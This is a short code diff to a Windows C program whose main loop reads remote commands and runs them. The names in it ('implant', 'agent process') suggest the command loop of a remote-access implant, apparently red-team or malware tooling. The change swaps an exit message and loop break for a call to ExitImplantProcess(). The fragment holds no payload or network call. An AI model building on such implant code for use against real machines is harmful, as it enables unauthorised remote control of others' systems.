@@ -16,9 +16,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         
             // Check for exit command
             if (strcmp(cmd, "exit") == 0) {
-                SendOutput("[+] Successfully stopped agent process");
-                break;  // Exit main loop
-            }
+                ExitImplantProcess();
+            } 
         
             ExecuteCommandWrapper(cmd);
         }
